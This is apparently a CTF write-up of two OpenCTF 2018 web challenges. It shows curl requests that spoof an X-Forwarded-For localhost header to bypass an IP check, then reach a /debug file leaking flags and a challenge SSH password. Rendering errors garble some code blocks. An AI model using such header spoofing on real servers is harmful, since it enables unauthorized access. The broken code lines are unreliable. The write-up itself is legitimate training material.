---
title: "OpenCTF 2018 - Forbidden Folly 1 & 2 Writeup"
slug: "openctf-2018-forbidden-folly-1-2-writeup"
date: "2018-08-14 22:40:45.421331"
author_name: "tecknicaltom"
author_email: "tecknicaltom@neg9.org"
draft: false
toc: false
images:
---

{language=python}
~~~~~~~~
Forbidden Folly 1 50 ---
Welcome to Hacker2, where uptime is a main prority: http://172.31.2.90

Forbidden Folly 2 50 ---
It seems like out of towners are terrible at scavenger hunts: http://172.31.2.91
~~~~~~~~

These challenges from OpenCTF 2018 at Defcon 26 were simple web challenges that took us way more time to solve than it should have.

Attempting to visit the page linked to in the hint only resulted in a 403 Forbidden response. Eventually an organizer alluded to the server caring about the origin of the request. This led us down the incorrect path of attempting to make the request with an `Origin` HTTP header.

Eventually though, we figured out that requesting the resource with an `X-Forwarded-For` HTTP header was the key:

"System Message: ERROR/3 (<string>:, line 15)"
Error in "code" directive:
maximum 1 argument(s) allowed, 6 supplied.

{language=python}
~~~~~~~~
.. code:: curl -v http://172.31.2.90/' -H 'X-Forwarded-For: 127.0.0.1'

~~~~~~~~

This returned an HTML page for the "HackerTwo System Status" page, and at the bottom of the source is the flag:

"System Message: ERROR/3 (<string>:, line 19)"
Error in "code" directive:
maximum 1 argument(s) allowed, 3 supplied.

{language=python}
~~~~~~~~
.. code:: <!-- flag(Th4t_WAS_To0_EASY} -->

~~~~~~~~

For the second challenge in the series, we first attempted to add other HTTP request headers that we thought the hint might be alluding to with "out of towners" such as `Accept-Language` but nothing seemed to affect the response.

The "HackerTwo System Status" page contained the following text:

> If at any point all systems stop responding you may want to check the system to verify everything is running properly. Tim placed a web terminal on the system for easy access, the location of that has been emailed to everyone who has access to this portal.

We thought this web terminal might be the key to finding the flag, so keeping the `X-Forwarded-For` header as before, we poked around a bit. Eventually after manually trying a few paths, we found `/debug` on the server returned a directory listing containing `secret.txt`, which contained the flag:

{language=python}
~~~~~~~~
curl -v 'http://172.31.2.91/debug/secret.txt' -H 'X-Forwarded-For: 127.0.0.1'
*   Trying 172.31.2.91...
* TCP_NODELAY set
* Connected to 172.31.2.91 (172.31.2.91) port 80 (#0)
> GET /debug/secret.txt HTTP/1.1
> Host: 172.31.2.91
> X-Forwarded-For: 127.0.0.1
>
< HTTP/1.1 200 OK
< Date: Sat, 11 Aug 2018 23:00:38 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Last-Modified: Tue, 24 Jul 2018 06:38:04 GMT
< ETag: "ea-571b901137e84"
< Accept-Ranges: bytes
< Content-Length: 234
< Vary: Accept-Encoding
< Content-Type: text/plain
<
Chad,

I've created an account for you here on the system. You can log into ssh with the user chad and the password FriendOfFolly^.
Please delete this message after you've read it.

PS: flag{Th3_nexT_0ne_iS_D1ff1cul7}

Thanks,
Grace
~~~~~~~~
